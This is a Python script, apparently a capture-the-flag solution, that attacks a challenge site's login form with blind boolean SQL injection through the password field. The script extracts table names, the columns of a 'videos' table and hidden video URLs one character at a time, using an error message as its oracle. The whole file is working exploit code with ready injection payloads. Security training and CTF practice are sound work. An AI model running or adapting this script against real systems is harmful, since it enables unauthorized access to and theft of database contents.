import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--skip", type=int, default=0, help="number of steps to skip")
args, _ = parser.parse_known_args()
SKIP = args.skip

URL = "http://m0lecon-plus.challs.olicyber.it/"  

def isTrue(response):
    # usiamo il successo della query come oracolo delle nostre query blind
    return "No user exists" not in response

if SKIP < 1:
    print("[*] Leaking first 2 tables...")
    for i in range(2):
        table_name = ""
        j = 1 
        
        while True:
            char_found_this_round = False
            
            for k in range(32, 127):
                
                payload = f'123" OR ascii(mid((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET {i}) FROM {j} FOR 1)) = {k} -- -'
                
                if isTrue(requests.post(URL, data={"username": "123", "password": payload}).text):
                    print(chr(k), end="", flush=True)
                    table_name += chr(k)
                    char_found_this_round = True
                    break
            
            if not char_found_this_round:
                # End of String
                break
                
            j += 1 # Move to next character
            
        if not table_name:
            # No more tables
            break
            
        print()

if SKIP < 2:
    print("[*] Leaking columns from 'videos' table...")
    i = 0 
    while True:
        column_name = ""
        j = 1
        
        while True:
            char_found = False
            for k in range(32, 127):
                query = f"SELECT column_name FROM information_schema.columns WHERE table_name = 'videos' LIMIT 1 OFFSET {i}"
                payload = f'123" OR ascii(mid(({query}) FROM {j} FOR 1)) = {k} -- -'
                
                if isTrue(requests.post(URL, data={"username": "123", "password": payload}).text):
                    print(chr(k), end="", flush=True)
                    column_name += chr(k)
                    char_found = True
                    break
            
            if not char_found:
                break
                
            j += 1
            
        if not column_name:
            print("\n[-] No more columns found.")
            break
            
        print()
        i += 1

i = 1
print("[*] Leaking URLs from 'videos' table where hidden = true...")
while True:
    char_found = False
    for j in range(32, 127):
        query = f"SELECT url FROM videos WHERE hidden = 1 LIMIT 1 OFFSET 0"
        payload = f'123" OR ascii(mid(({query}) FROM {i} FOR 1)) = {j} -- -'
        
        if isTrue(requests.post(URL, data={"username": "123", "password": payload}).text):
            print(chr(j), end="", flush=True)
            char_found = True
            break
    
    if not char_found:
        break
        
    i += 1
